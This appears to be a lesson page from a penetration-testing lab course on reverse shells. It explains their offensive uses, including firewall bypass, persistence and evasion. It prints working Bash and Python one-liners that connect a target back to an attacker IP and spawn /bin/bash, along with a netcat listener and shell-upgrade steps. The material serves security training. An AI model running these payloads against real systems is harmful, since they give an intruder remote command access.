# 04-10: Establishing Reverse Shells

## What is it used for?
A reverse shell is a fundamental technique in offensive security used to gain interactive command-line access to a target system. Unlike a "bind shell" where the attacker connects to a port on the target, a "reverse shell" involves the target connecting back to the attacker.

This is primarily used for:
- **Bypassing Firewalls**: Most firewalls are configured to block incoming connections but allow outgoing traffic (especially on common ports like 80 or 443).
- **Gaining Initial Access**: After exploiting a vulnerability (like command injection), a reverse shell provides a stable environment for further exploration.
- **Post-Exploitation**: Facilitating lateral movement and privilege escalation once a foothold is established.
- **Persistence**: Setting up automated scripts that "call home" periodically to ensure continued access.

## Techniques
- **Listener Setup**: Configuring a local tool to wait for and accept an incoming connection.
- **Payload Injection**: Executing a specific command or script on the target that triggers the outbound connection.
- **Port Selection**: Using "stealthy" ports (e.g., 443/HTTPS or 53/DNS) to blend in with normal outbound traffic.
- **Interactive Shell Upgrading**: Converting a "dumb" shell into a fully functional TTY (with tab completion, history, etc.).
- **Encoding and Obfuscation**: Modifying payloads to avoid detection by Antivirus (AV) or Endpoint Detection and Response (EDR) systems.

## How those techniques are used
- **Netcat Listeners**: Setting up `nc` on Kali to catch the incoming connection from the target.
- **One-Liner Payloads**: Crafting short, powerful commands in Bash, Python, or PHP that can be pasted into an exploit string.
- **TTY Stabilization**: After catching a shell, using Python's `pty` module or `stty` tricks to make the shell behave like a real terminal.
- **Metasploit/Meterpreter**: Using advanced frameworks to generate multi-stage payloads that provide a rich suite of post-exploitation tools.

## Commands used

### Setting up a Listener (Kali)
```bash
nc -lvnp 4444
```

### Bash Reverse Shell (Target)
```bash
bash -i >& /dev/tcp/10.0.2.5/4444 0>&1
```

### Python Reverse Shell (Target)
```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

### Upgrading to a TTY Shell
Inside the reverse shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Then (Ctrl+Z):
```bash
stty raw -echo; fg
```
Then (type `reset` and hit enter):
```bash
export TERM=xterm
```

## Summary
Reverse shells are a cornerstone of the exploitation phase in our lab. By understanding how to set up listeners and deploy varied payloads, you can bypass network security controls and gain a functional foothold on target systems. Mastery of these techniques is essential for any aspiring penetration tester, as it allows for the transition from a simple exploit to a comprehensive system analysis.

## Reference links
- [PayloadsAllTheThings: Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet)
- [Netcat: The TCP/IP Swiss Army Knife](https://nc110.sourceforge.io/)
- [OWASP: Reverse Shell Guide](https://cheatsheetseries.owasp.org/cheatsheets/Reverse_Shell_Cheat_Sheet.html)
- [Python pty module documentation](https://docs.python.org/3/library/pty.html)

## Next Lesson
[Next Lesson: 05-01 - Defensive Methodology and Incident Response](/lessons/module-5/05-01-defensive-methodology-and-incident-response)
